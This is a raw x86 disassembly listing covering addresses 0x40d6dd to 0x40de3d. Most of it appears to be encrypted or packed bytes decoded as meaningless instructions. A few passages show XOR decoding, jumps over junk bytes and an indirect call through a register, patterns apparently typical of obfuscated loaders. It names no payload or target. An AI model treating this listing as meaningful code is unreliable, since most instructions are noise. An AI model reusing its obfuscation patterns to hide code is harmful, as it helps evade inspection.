  40d6dd:	xor    cl,BYTE PTR ds:[ebp-0x4e88a3e]
  40d6e4:	inc    eax
  40d6e5:	xor    cl,BYTE PTR [ecx+0x0]
  40d6e8:	stc    
  40d6e9:	cwde   
  40d6ea:	(bad)  [ebp+0x6419135]
  40d6f0:	stos   DWORD PTR es:[edi],eax
  40d6f1:	jae    0x40d6a1
  40d6f3:	inc    esi
  40d6f4:	sbb    bh,BYTE PTR [edx+edx*8]
  40d6f7:	xor    edx,ecx
  40d6f9:	mov    ecx,DWORD PTR [ebp+0x8]
  40d6fc:	lea    ecx,[edx+ecx*1+0x32729d]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	mov    dh,0x9
  40d73e:	mov    eax,ds:0x7e8001f4
  40d743:	jle    0x40d784
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d70e
  40d749:	pop    eax
  40d74a:	mov    ah,0xc2
  40d74c:	mov    dh,0x9c
  40d74e:	leave  
  40d74f:	popf   
  40d750:	clc    
  40d751:	pop    ecx
  40d752:	jge    0x40d769
  40d754:	scas   al,BYTE PTR es:[edi]
  40d755:	sub    BYTE PTR [edx],dl
  40d757:	jno    0x40d70b
  40d759:	push   edi
  40d75a:	in     al,dx
  40d75b:	into   
  40d75c:	xor    al,BYTE PTR [esi-0x690ceffa]
  40d762:	(bad)  
  40d763:	icebp  
  40d764:	leave  
  40d765:	pop    ebp
  40d766:	or     edi,edx
  40d768:	out    dx,al
  40d769:	adc    BYTE PTR [ecx],bl
  40d76b:	cwde   
  40d76c:	in     al,dx
  40d76d:	(bad)  
  40d76e:	loopne 0x40d79e
  40d770:	mov    bl,0x41
  40d772:	push   0x30
  40d774:	and    al,0x2e
  40d776:	mov    ch,0x30
  40d778:	es jne 0x40d7eb
  40d77b:	dec    edi
  40d77c:	or     eax,0x275fbe1e
  40d781:	aas    
  40d782:	rcl    BYTE PTR [ebx-0x1f3561c1],0x23
  40d789:	jns    0x40d7cf
  40d78b:	das    
  40d78c:	fnstenv [ebx]
  40d78e:	fisub  DWORD PTR [edx]
  40d790:	pop    esi
  40d791:	mul    DWORD PTR [eax]
  40d793:	dec    esi
  40d794:	(bad)  
  40d795:	jmp    0x37225934
  40d79a:	jb     0x40d735
  40d79c:	add    ecx,esi
  40d79e:	mov    edx,0x795df3a6
  40d7a3:	cs pop ebp
  40d7a5:	mov    bh,0xb9
  40d7a7:	arpl   WORD PTR [ebx],bp
  40d7a9:	outs   dx,BYTE PTR ds:[esi]
  40d7aa:	push   eax
  40d7ab:	(bad)
  40d7af:	fsub   DWORD PTR [ebx]
  40d7b1:	shr    BYTE PTR [ebx+0x7e],0xf2
  40d7b5:	dec    esp
  40d7b6:	stos   DWORD PTR es:[edi],eax
  40d7b7:	aas    
  40d7b8:	jmp    0x54a809b0
  40d7bd:	int    0xcb
  40d7bf:	mov    ebx,esi
  40d7c1:	add    al,bl
  40d7c3:	inc    ecx
  40d7c4:	cmp    edx,DWORD PTR [ebx+0x2b91ee33]
  40d7ca:	cs xchg esp,eax
  40d7cc:	sahf   
  40d7cd:	sahf   
  40d7ce:	add    edi,ebp
  40d7d0:	repnz push ebp
  40d7d2:	push   esi
  40d7d3:	mov    ebx,0x248c374
  40d7d8:	fsubr  DWORD PTR [edi]
  40d7da:	data16 je 0x40d84b
  40d7dd:	mov    ds,WORD PTR [edx]
  40d7df:	inc    eax
  40d7e0:	inc    ebp
  40d7e1:	push   ebp
  40d7e2:	pop    ss
  40d7e3:	pop    esi
  40d7e4:	fbstp  TBYTE PTR [edx-0x37]
  40d7e7:	sub    esi,DWORD PTR [edi+0x48f6ec1b]
  40d7ed:	enter  0xd5ff,0x72
  40d7f1:	je     0x40d7e4
  40d7f3:	clc    
  40d7f4:	addr16 cdq 
  40d7f6:	push   edx
  40d7f7:	cdq    
  40d7f8:	or     eax,0xa687f17e
  40d7fd:	pop    ecx
  40d7fe:	pop    esp
  40d7ff:	adc    DWORD PTR [ecx+0x4c],0xffffffb7
  40d803:	shl    DWORD PTR [eax],0x3f
  40d806:	pop    esp
  40d807:	out    dx,al
  40d808:	jne    0x40d860
  40d80a:	out    0x72,al
  40d80c:	in     al,0x1f
  40d80e:	jge    0x40d7b2
  40d810:	sbb    al,0x10
  40d812:	fs add al,0xbf
  40d815:	into   
  40d816:	idiv   bh
  40d818:	repnz mov ebx,0x44ba5c1d
  40d81e:	jmp    0x40d876
  40d820:	sahf   
  40d821:	bound  ebp,QWORD PTR [eax+0x285376f2]
  40d827:	pop    eax
  40d828:	jg     0x40d7ef
  40d82a:	inc    BYTE PTR [esi+0x1c]
  40d82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d82e:	cmp    ch,BYTE PTR ds:0x12f0a5ca
  40d834:	jp     0x40d866
  40d836:	retf   
  40d837:	and    eax,0x95359638
  40d83c:	xchg   edx,eax
  40d83d:	imul   edi,DWORD PTR [eax],0x401c1d7
  40d843:	(bad)  
  40d844:	fimul  WORD PTR [edx]
  40d846:	mov    cl,0x59
  40d848:	aaa    
  40d849:	mov    WORD PTR [ebp+0x3336ce0e],fs
  40d84f:	and    al,0xce
  40d851:	jns    0x40d852
  40d853:	mov    ds:0x5a12d8d2,eax
  40d858:	xchg   ebp,eax
  40d859:	mov    ds:0xe0de5344,al
  40d85e:	xchg   ebp,eax
  40d85f:	into   
  40d860:	pop    ecx
  40d861:	test   al,0xee
  40d863:	mov    DWORD PTR [edi+0x50],edx
  40d866:	adc    eax,0x64fe5211
  40d86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d86c:	mov    esp,0xfdc0f6fb
  40d871:	jge    0x40d884
  40d873:	push   edi
  40d874:	push   ds
  40d875:	clc    
  40d876:	popf   
  40d877:	ds jae 0x40d8a7
  40d87a:	add    esp,DWORD PTR [edi+0x5dffd28f]
  40d880:	out    0x77,al
  40d882:	rcr    DWORD PTR [esi+edi*8-0x7],1
  40d886:	mov    dl,BYTE PTR [edx]
  40d888:	cld    
  40d889:	call   ebx
  40d88b:	xor    ebx,ebx
  40d88d:	jmp    0x40d9eb
  40d892:	mul    BYTE PTR [ebx-0x6c]
  40d895:	jne    0x40d914
  40d897:	lds    edx,FWORD PTR [edi+0x51026b7d]
  40d89d:	mov    ebx,DWORD PTR [eax-0x3d61a98b]
  40d8a3:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f3f
  40d8aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ab:	int3   
  40d8ac:	in     al,dx
  40d8ad:	push   esp
  40d8ae:	xchg   esi,eax
  40d8af:	outs   dx,DWORD PTR gs:[esi]
  40d8b1:	call   DWORD PTR [eax]
  40d8b3:	mov    ch,0x79
  40d8b5:	push   ebx
  40d8b6:	sub    al,BYTE PTR [ecx-0xfdd8362]
  40d8bc:	ds inc ebx
  40d8be:	inc    ebx
  40d8bf:	mov    edi,0xe06f4f2c
  40d8c4:	loop   0x40d8ee
  40d8c6:	ret    0x79a6
  40d8c9:	sub    al,0xa
  40d8cb:	and    dh,ah
  40d8cd:	jle    0x40d92a
  40d8cf:	mov    cl,0xe5
  40d8d1:	pop    ss
  40d8d2:	(bad)  
  40d8d3:	stc    
  40d8d4:	jmp    0x40d8a0
  40d8d6:	(bad)  
  40d8d7:	adc    al,0x5a
  40d8d9:	or     ax,0xf878
  40d8dd:	out    dx,al
  40d8de:	dec    ecx
  40d8df:	cmp    BYTE PTR [ebx-0x4a10fa32],bl
  40d8e5:	xor    BYTE PTR [esi],0xe
  40d8e8:	add    BYTE PTR [edi],bl
  40d8ea:	or     dl,BYTE PTR [esi-0x2a086e43]
  40d8f0:	jbe    0x40d896
  40d8f2:	test   eax,0x8cc359a4
  40d8f7:	in     eax,dx
  40d8f8:	xchg   edi,eax
  40d8f9:	and    edx,DWORD PTR [ebp+0x6f]
  40d8fc:	pop    ebx
  40d8fd:	test   ch,bl
  40d8ff:	mov    cl,0x15
  40d901:	jmp    0x40d8f9
  40d903:	lods   al,BYTE PTR ds:[esi]
  40d904:	int3   
  40d905:	ror    ebp,1
  40d907:	mov    esi,0x294a17d7
  40d90c:	rcl    DWORD PTR [ebp+0x6ec2353a],1
  40d912:	add    ch,BYTE PTR [ecx-0x5ee9b203]
  40d918:	lahf   
  40d919:	cld    
  40d91a:	dec    edi
  40d91b:	out    dx,eax
  40d91c:	add    BYTE PTR [esi],ch
  40d91e:	xor    BYTE PTR [edi],al
  40d920:	aas    
  40d921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d922:	repz fwait
  40d924:	pop    ds
  40d925:	(bad)  
  40d926:	ss je  0x40d96d
  40d929:	push   ds
  40d92a:	mov    ebp,0x45e5fa37
  40d92f:	mov    ah,0x2e
  40d931:	or     dh,dh
  40d933:	xchg   esp,eax
  40d934:	sti    
  40d935:	mov    edx,0xf6f84749
  40d93a:	icebp  
  40d93b:	aad    0x5c
  40d93d:	push   esp
  40d93e:	shl    DWORD PTR [ebx],1
  40d940:	mov    ch,0xe0
  40d942:	scas   eax,DWORD PTR es:[edi]
  40d943:	nop
  40d944:	out    0x4b,al
  40d946:	imul   ebp,esi,0x27
  40d949:	pop    ebx
  40d94a:	push   ebx
  40d94b:	xlat   BYTE PTR ds:[ebx]
  40d94c:	rcl    DWORD PTR es:[edx+0x44be3e09],0xeb
  40d954:	mov    ecx,DWORD PTR [eax+0x2004e2b2]
  40d95a:	les    eax,FWORD PTR [ebx]
  40d95c:	add    eax,0x3c034a64
  40d961:	and    BYTE PTR [edx+ebp*8-0x74542c5f],dh
  40d968:	xchg   edx,eax
  40d969:	int3   
  40d96a:	pop    edi
  40d96b:	clc    
  40d96c:	sbb    DWORD PTR [edi-0x62],edx
  40d96f:	scas   al,BYTE PTR es:[edi]
  40d970:	add    ah,BYTE PTR [eax-0x540414bf]
  40d976:	out    0xb1,al
  40d978:	mov    eax,ds:0x5ca96260
  40d97d:	adc    al,0xf4
  40d97f:	data16 fnstsw WORD PTR [edi+eiz*1-0xc]
  40d984:	les    edx,FWORD PTR ds:0xf9b148cf
  40d98a:	sub    edi,edx
  40d98c:	push   ebx
  40d98d:	popa   
  40d98e:	or     eax,0xc82efad1
  40d993:	rcl    DWORD PTR [ebx-0x68],cl
  40d996:	cmp    BYTE PTR ss:[edx],0xf1
  40d99a:	add    edx,esi
  40d99c:	jmp    0x18bfdae8
  40d9a1:	jbe    0x40da1c
  40d9a3:	pop    esi
  40d9a4:	daa    
  40d9a5:	dec    edx
  40d9a6:	jne    0x40d928
  40d9a8:	jp     0x40d9fb
  40d9aa:	mov    cl,0xb2
  40d9ac:	loopne 0x40d9fa
  40d9ae:	xchg   esp,eax
  40d9af:	daa    
  40d9b0:	stos   BYTE PTR es:[edi],al
  40d9b1:	jb     0x40d9ce
  40d9b3:	add    cl,cl
  40d9b5:	sbb    ah,BYTE PTR [esi+0x63]
  40d9b8:	sbb    dl,BYTE PTR [esi+0x14]
  40d9bb:	popf   
  40d9bc:	or     ah,BYTE PTR [ecx]
  40d9be:	das    
  40d9bf:	xchg   ebp,eax
  40d9c0:	repz adc al,0xb1
  40d9c3:	jmp    0x40da38
  40d9c5:	pop    edi
  40d9c6:	mov    ch,0x3e
  40d9c8:	ss iret 
  40d9ca:	loop   0x40d98b
  40d9cc:	ss aaa 
  40d9ce:	sbb    DWORD PTR es:[eax],esp
  40d9d1:	(bad)  
  40d9d2:	xchg   esi,eax
  40d9d3:	mov    cl,0x53
  40d9d5:	jne    0x40da19
  40d9d7:	push   0xfffffffc
  40d9d9:	test   BYTE PTR [edi],dh
  40d9db:	dec    edx
  40d9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9dd:	mov    eax,0x3966d2ae
  40d9e2:	pop    eax
  40d9e3:	xor    BYTE PTR [ecx-0x2bc7f881],0x35
  40d9ea:	push   esp
  40d9eb:	inc    ebx
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	stc    
  40d9fe:	frstor fs:[edx-0x7d]
  40da02:	cmp    BYTE PTR [esi+0x7e],0x3f
  40da06:	jg     0x40da86
  40da08:	jle    0x40d9f8
  40da0a:	fbld   TBYTE PTR [ecx]
  40da0c:	mov    esi,ebx
  40da0e:	out    0x4b,al
  40da10:	xchg   ecx,eax
  40da11:	loopne 0x40da4b
  40da13:	adc    BYTE PTR [esi+esi*8+0x73],ah
  40da17:	pop    ebp
  40da18:	push   eax
  40da19:	or     eax,0x12b107c4
  40da1e:	jns    0x40d9ce
  40da20:	inc    esi
  40da21:	rol    esp,0x31
  40da24:	push   edx
  40da25:	and    BYTE PTR [eax-0x2cf80fc0],dl
  40da2b:	xchg   edx,eax
  40da2c:	or     bl,BYTE PTR [eax]
  40da2e:	cmp    BYTE PTR [ecx],bh
  40da30:	(bad)
  40da33:	jg     0x40da63
  40da35:	repnz fisubr DWORD PTR [ecx+0x7e]
  40da39:	daa    
  40da3a:	adc    eax,edi
  40da3c:	jl     0x40daa9
  40da3e:	ds enter 0x3313,0xa2
  40da43:	or     esp,DWORD PTR [ebp+eax*2-0x44]
  40da47:	xchg   DWORD PTR [esi-0x248763d],esp
  40da4d:	and    al,BYTE PTR [ebx+edi*1]
  40da50:	jno    0x40dab8
  40da52:	mov    esi,0xd7ffaf82
  40da57:	in     eax,dx
  40da58:	jns    0x40da28
  40da5a:	jnp    0x40da6d
  40da5c:	data16 and BYTE PTR [ebp+0x9fab58f],dl
  40da63:	dec    edi
  40da64:	mov    eax,ds:0xe5e5cddf
  40da69:	mov    ecx,0x3b3a048c
  40da6e:	imul   ebp,edi,0xb630a699
  40da74:	cmp    al,0x96
  40da76:	inc    ecx
  40da77:	push   es
  40da78:	mov    esi,0x8dadd552
  40da7d:	dec    ecx
  40da7e:	add    eax,0x2ac157cf
  40da83:	sub    esp,DWORD PTR [ecx+0x6127e294]
  40da89:	and    al,0x41
  40da8b:	(bad)  
  40da8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da8d:	gs (bad) 
  40da8f:	imul   esp,DWORD PTR [ebp+edi*1-0x7dd5a135],0x30
  40da97:	dec    edi
  40da98:	lods   al,BYTE PTR ds:[esi]
  40da99:	repz jge 0x40dac5
  40da9c:	adc    esp,DWORD PTR [edi+0x51900a12]
  40daa2:	sbb    DWORD PTR [ebp+0x63e45866],esi
  40daa8:	ret    
  40daa9:	add    eax,esp
  40daab:	pop    edx
  40daac:	push   ds
  40daad:	sbb    DWORD PTR [edx-0xeecb628],eax
  40dab3:	push   cs
  40dab4:	mov    al,ds:0x9da5a6cd
  40dab9:	and    DWORD PTR [ebx+0x1ec987ab],edi
  40dabf:	fimul  DWORD PTR [eax+0x66e3f7c0]
  40dac5:	test   BYTE PTR [ebx+0x4140fa52],bl
  40dacb:	adc    BYTE PTR [esi],0x48
  40dace:	lahf   
  40dacf:	mov    DWORD PTR [ebx+0x40393c95],ebx
  40dad5:	jl     0x40db0e
  40dad7:	and    bh,0x69
  40dada:	xchg   esp,eax
  40dadb:	lods   al,BYTE PTR ds:[esi]
  40dadc:	pop    ebx
  40dadd:	loopne 0x40da7a
  40dadf:	mov    dl,0x5
  40dae1:	scas   eax,DWORD PTR es:[edi]
  40dae2:	lea    edx,ds:0xa2c9e10d
  40dae8:	mov    DWORD PTR [esi+0x52525462],0xb97208d9
  40daf2:	cmp    eax,0x3166e7fc
  40daf7:	xchg   esp,eax
  40daf8:	jbe    0x40dafe
  40dafa:	lods   eax,DWORD PTR ds:[esi]
  40dafb:	retf   0xcb43
  40dafe:	retf   0xb2b6
  40db01:	scas   eax,DWORD PTR es:[edi]
  40db02:	push   ebx
  40db03:	ret    0xbf34
  40db06:	sub    dl,BYTE PTR [ecx+ebp*2]
  40db09:	inc    ecx
  40db0a:	test   DWORD PTR [esi-0x3a0c0903],ebx
  40db10:	aas    
  40db11:	jge    0x40dace
  40db13:	jmp    0x40dab2
  40db15:	scas   al,BYTE PTR es:[edi]
  40db16:	addr16 sbb al,0x6a
  40db19:	jecxz  0x40dacb
  40db1b:	call   0x846115c7
  40db20:	pushf  
  40db21:	(bad)  
  40db22:	push   esp
  40db23:	ss cld 
  40db25:	(bad)  
  40db26:	sahf   
  40db27:	mov    eax,0xfb633e6d
  40db2c:	mov    ah,0xc1
  40db2e:	push   edi
  40db2f:	sbb    al,0xc6
  40db31:	imul   esi,ecx,0xffffffe0
  40db34:	shr    DWORD PTR [edx+ecx*1-0x48],1
  40db38:	sub    al,0x23
  40db3a:	xchg   esp,eax
  40db3b:	or     bl,al
  40db3d:	sub    edx,ebp
  40db3f:	sbb    eax,0x46da51de
  40db44:	stos   DWORD PTR es:[edi],eax
  40db45:	ss icebp 
  40db47:	jle    0x40db32
  40db49:	xchg   esi,eax
  40db4a:	cmp    DWORD PTR [ebp+0x10],ebx
  40db4d:	je     0x40df85
  40db53:	jmp    0x40dcb1
  40db58:	xchg   ebp,eax
  40db59:	mov    BYTE PTR [esi-0x42c354e4],bl
  40db5f:	mov    ecx,0xd105ab5
  40db64:	fsub   QWORD PTR cs:[edi]
  40db67:	adc    BYTE PTR [ebx+eax*4+0x7e],al
  40db6b:	jle    0x40dbac
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40db96
  40db71:	and    ah,bl
  40db73:	push   esi
  40db74:	or     BYTE PTR [ecx+ebx*8+0x5c444945],ah
  40db7b:	sub    BYTE PTR [eax],0xa9
  40db7e:	outs   dx,DWORD PTR ds:[esi]
  40db7f:	enter  0x7816,0x7c
  40db83:	aas    
  40db84:	dec    edi
  40db85:	test   al,0x5f
  40db87:	xlat   BYTE PTR ds:[ebx]
  40db88:	inc    ebx
  40db89:	outs   dx,BYTE PTR ds:[esi]
  40db8a:	dec    ecx
  40db8b:	and    BYTE PTR es:[ebx],cl
  40db8e:	lods   eax,DWORD PTR ds:[esi]
  40db8f:	rcr    cl,cl
  40db91:	sub    eax,0x1e0c6f05
  40db96:	not    BYTE PTR [edi+0x6f]
  40db99:	leave  
  40db9a:	adc    DWORD PTR [ecx+0x546ff272],esi
  40dba0:	je     0x40db3b
  40dba2:	ins    DWORD PTR es:[edi],dx
  40dba3:	imul   BYTE PTR [eax+edx*1]
  40dba6:	pop    es
  40dba7:	shl    eax,1
  40dba9:	imul   eax,edx,0x9f63c59e
  40dbaf:	xor    DWORD PTR [ecx-0x35],esi
  40dbb2:	push   es
  40dbb3:	add    edx,edx
  40dbb5:	(bad)  
  40dbb6:	jmp    0x6c893f7c
  40dbbb:	mov    cl,bh
  40dbbd:	adc    edx,DWORD PTR [ecx-0x54]
  40dbc0:	call   0x1c317a84
  40dbc5:	pop    ss
  40dbc6:	fisub  WORD PTR [edx+0x76]
  40dbc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbca:	mov    cl,0xe9
  40dbcc:	call   0xdc1f3354
  40dbd1:	pop    esi
  40dbd2:	outs   dx,DWORD PTR ds:[esi]
  40dbd3:	adc    DWORD PTR [ebx-0x6cac044a],eax
  40dbd9:	and    BYTE PTR [edi-0xd],bl
  40dbdc:	jb     0x40db9c
  40dbde:	adc    al,0x2c
  40dbe0:	pop    ds
  40dbe1:	in     eax,0xf0
  40dbe3:	out    0x75,al
  40dbe5:	jbe    0x40dc63
  40dbe7:	ins    DWORD PTR es:[edi],dx
  40dbe8:	mov    eax,ds:0x2166f3a4
  40dbed:	sbb    al,0xb3
  40dbef:	int    0xfa
  40dbf1:	cmc    
  40dbf2:	pop    ebx
  40dbf3:	add    eax,DWORD PTR [ebp+0x75299ff9]
  40dbf9:	add    ebx,edx
  40dbfb:	sbb    edi,DWORD PTR [esi]
  40dbfd:	fimul  DWORD PTR [esi+0x798e9bc7]
  40dc03:	mov    al,0x61
  40dc05:	aam    0x26
  40dc07:	in     eax,0xf1
  40dc09:	mov    esp,0x30d64852
  40dc0e:	cmp    eax,0x76bcd04
  40dc13:	add    eax,DWORD PTR [ebx-0x7590534a]
  40dc19:	xchg   esi,eax
  40dc1a:	pop    ecx
  40dc1b:	arpl   WORD PTR [ebp+edi*8-0xe3ae696],cx
  40dc22:	fild   WORD PTR [ecx-0x56]
  40dc25:	inc    esi
  40dc26:	inc    eax
  40dc27:	ret    0x49c2
  40dc2a:	repnz xor dh,dh
  40dc2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc2f:	cmp    ecx,DWORD PTR [ebp-0x41dee666]
  40dc35:	xchg   edi,eax
  40dc36:	xchg   esi,eax
  40dc37:	leave  
  40dc38:	fild   QWORD PTR [esi]
  40dc3a:	sar    BYTE PTR [esp+eax*1-0xf64cb3f],1
  40dc41:	ret    
  40dc42:	push   DWORD PTR [ebx+0x49]
  40dc45:	outs   dx,BYTE PTR ds:[esi]
  40dc46:	out    0xce,al
  40dc48:	(bad)  
  40dc4a:	mov    ds,edi
  40dc4c:	cld    
  40dc4d:	popf   
  40dc4e:	dec    esi
  40dc4f:	jmp    0xe6591d53
  40dc54:	xchg   ebp,eax
  40dc55:	into   
  40dc56:	mov    edi,0x57274dd5
  40dc5b:	mov    ah,BYTE PTR [eax+0x49e63c0]
  40dc61:	(bad)  
  40dc62:	lock and cl,BYTE PTR [edi+eiz*1-0x129b914b]
  40dc6a:	add    al,0xa4
  40dc6c:	fwait
  40dc6d:	mov    al,ds:0x32e9f2a0
  40dc72:	xchg   edx,eax
  40dc73:	das    
  40dc74:	out    dx,eax
  40dc75:	(bad)  
  40dc76:	imul   ebp,esi,0xffffffba
  40dc79:	outs   dx,BYTE PTR ds:[esi]
  40dc7a:	test   eax,0xee2e1f6e
  40dc7f:	fldcw  WORD PTR [ebp+0x5a]
  40dc82:	mov    ebx,0x9600f2b0
  40dc87:	mov    di,0x6d09
  40dc8b:	xchg   BYTE PTR [ecx-0x79],bl
  40dc8e:	inc    esp
  40dc8f:	stos   BYTE PTR es:[edi],al
  40dc90:	mov    BYTE PTR [esi-0x65d022ee],al
  40dc96:	rcl    BYTE PTR [eax],1
  40dc98:	rcr    bh,0x10
  40dc9b:	push   ecx
  40dc9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc9d:	dec    ecx
  40dc9e:	test   DWORD PTR [ebp+0x58],0x65f0299c
  40dca5:	test   DWORD PTR ds:0x97520357,ebp
  40dcab:	lahf   
  40dcac:	dec    ebx
  40dcad:	or     al,0xd2
  40dcaf:	fs jecxz 0x40dc44
  40dcb2:	jmp    0x40de10
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x82af3fe9,cl
  40dcc5:	mov    ebx,0x7e850544
  40dcca:	jle    0x40dd0b
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dc71
  40dcd0:	bound  ecx,QWORD PTR [ecx+0x7d]
  40dcd3:	jb     0x40dcc0
  40dcd5:	or     BYTE PTR [edx+0x6a],dl
  40dcd8:	div    DWORD PTR [esi]
  40dcda:	xor    BYTE PTR [edi+0x72d6206b],bh
  40dce0:	cwde   
  40dce1:	(bad)  
  40dce2:	xor    ah,BYTE PTR [edx+0x48]
  40dce5:	out    dx,al
  40dce6:	ja     0x40dd64
  40dce8:	push   cs
  40dce9:	mov    BYTE PTR [eax],al
  40dceb:	mov    cs,eax
  40dced:	fldenv ds:0x37b59a6e
  40dcf3:	iret   
  40dcf4:	fisub  DWORD PTR [esi]
  40dcf6:	mov    DWORD PTR ds:[ecx+0x35bfcb26],0xbe937bb3
  40dd01:	(bad)  
  40dd02:	ins    BYTE PTR es:[edi],dx
  40dd03:	int3   
  40dd04:	rol    bl,cl
  40dd06:	jmp    0x40dd12
  40dd08:	add    al,0xe7
  40dd0a:	je     0x40dd44
  40dd0c:	push   es
  40dd0d:	jmp    FWORD PTR [edx+0x79c56e30]
  40dd13:	jl     0x40dd16
  40dd15:	repnz xor al,0x26
  40dd18:	jg     0x40dd1e
  40dd1a:	xchg   edi,eax
  40dd1b:	push   es
  40dd1c:	pop    eax
  40dd1d:	dec    esi
  40dd1e:	jbe    0x40dca2
  40dd20:	mov    edi,0xb7ee03d0
  40dd25:	mov    edi,0x3ff2c630
  40dd2a:	mov    al,0xd1
  40dd2c:	inc    ebx
  40dd2d:	loope  0x40dd2e
  40dd2f:	data16 mov dl,ah
  40dd32:	cmp    al,0x4d
  40dd34:	pop    es
  40dd35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd36:	in     eax,dx
  40dd37:	cmp    ecx,edi
  40dd39:	adc    al,0x86
  40dd3b:	mov    ah,0xa2
  40dd3d:	sbb    DWORD PTR ds:0x92cbe32e,ecx
  40dd43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd44:	pop    edi
  40dd45:	dec    ch
  40dd47:	bound  ecx,QWORD PTR [ebp-0x67]
  40dd4a:	scas   al,BYTE PTR es:[edi]
  40dd4b:	sbb    bl,BYTE PTR [eax-0x1f]
  40dd4e:	fistp  DWORD PTR [ebp-0x19281ae]
  40dd54:	push   esi
  40dd55:	dec    ecx
  40dd56:	push   0x39
  40dd58:	data16 int3 
  40dd5a:	add    ch,BYTE PTR [ecx]
  40dd5c:	ja     0x40dd3c
  40dd5e:	stos   DWORD PTR es:[edi],eax
  40dd5f:	cmp    edi,DWORD PTR [ebp-0x2315f8a2]
  40dd65:	out    dx,eax
  40dd66:	cmp    al,0x8e
  40dd68:	inc    ebp
  40dd69:	nop
  40dd6a:	imul   ecx,DWORD PTR [ecx],0xffffffc0
  40dd6d:	inc    esi
  40dd6e:	repz ja 0x40dda1
  40dd71:	sar    DWORD PTR [edi],0x7d
  40dd74:	add    BYTE PTR [ebp-0x4bc2a347],al
  40dd7a:	rol    BYTE PTR [ecx],1
  40dd7c:	xlat   BYTE PTR ds:[ebx]
  40dd7d:	jno    0x40dd43
  40dd7f:	push   0xffffffde
  40dd81:	mov    ebp,0xa3670f4a
  40dd86:	jge    0x40dd24
  40dd88:	cdq    
  40dd89:	outs   dx,BYTE PTR ds:[esi]
  40dd8a:	aam    0x33
  40dd8c:	fldcw  WORD PTR [ebp-0x37]
  40dd8f:	(bad)  
  40dd90:	(bad)  
  40dd91:	jmp    0x76d0c38d
  40dd96:	mov    ecx,0x774944ad
  40dd9b:	xchg   edi,eax
  40dd9c:	loopne 0x40de01
  40dd9e:	es aaa 
  40dda0:	sti    
  40dda1:	add    al,0xe5
  40dda3:	out    0xdb,eax
  40dda5:	pop    ss
  40dda6:	out    0xc2,eax
  40dda8:	cli    
  40dda9:	sub    eax,0x8d5070dd
  40ddae:	fnstcw WORD PTR [esi-0x4583a990]
  40ddb4:	jmp    0xcfc6:0x82d32b0e
  40ddbb:	js     0x40ddfa
  40ddbd:	mov    ebx,0xca9419b3
  40ddc2:	stos   DWORD PTR es:[edi],eax
  40ddc3:	inc    esp
  40ddc4:	add    DWORD PTR [ecx+eax*8-0x68],0x49
  40ddc9:	jmp    0x8cc8:0xea7e185e
  40ddd0:	hlt    
  40ddd1:	dec    esi
  40ddd2:	lods   eax,DWORD PTR ds:[esi]
  40ddd3:	cs xchg esi,eax
  40ddd5:	mov    dl,0xbd
  40ddd7:	aas    
  40ddd8:	and    al,bh
  40ddda:	sar    BYTE PTR [edx-0x19],cl
  40dddd:	call   0x7d18d51f
  40dde2:	pop    eax
  40dde3:	inc    ebx
  40dde4:	jne    0x40de5f
  40dde6:	or     BYTE PTR [edx],al
  40dde8:	outs   dx,DWORD PTR ds:[esi]
  40dde9:	das    
  40ddea:	jbe    0x40de5f
  40ddec:	inc    esp
  40dded:	or     BYTE PTR [ebx+0x1f],cl
  40ddf0:	dec    ebx
  40ddf1:	gs pop ebx
  40ddf3:	cwde   
  40ddf4:	mov    WORD PTR [eax+ebx*2-0x69],?
  40ddf8:	fwait
  40ddf9:	xor    eax,0xaf14141
  40ddfe:	test   al,0xe7
  40de00:	test   al,0x35
  40de02:	fsub   QWORD PTR [ecx]
  40de04:	push   ss
  40de05:	fnstsw WORD PTR [ebp-0x40]
  40de08:	loopne 0x40ddd2
  40de0a:	sub    al,0x86
  40de0c:	jb     0x40ddb8
  40de0e:	scas   eax,DWORD PTR es:[edi]
  40de0f:	xchg   BYTE PTR [edx+0xa],ch
  40de12:	pop    ecx
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0x83aabf8d
  40de2d:	push   eax
  40de2e:	mov    BYTE PTR [esi+0x7f3f7e7e],0x7e
  40de35:	jle    0x40ddd2
  40de37:	daa    
  40de38:	jmp    0x40ddbb
  40de3a:	mov    DWORD PTR [eax-0x5f],eax
  40de3d:	bound  ecx,QWORD PTR [ecx-0x21723a31]
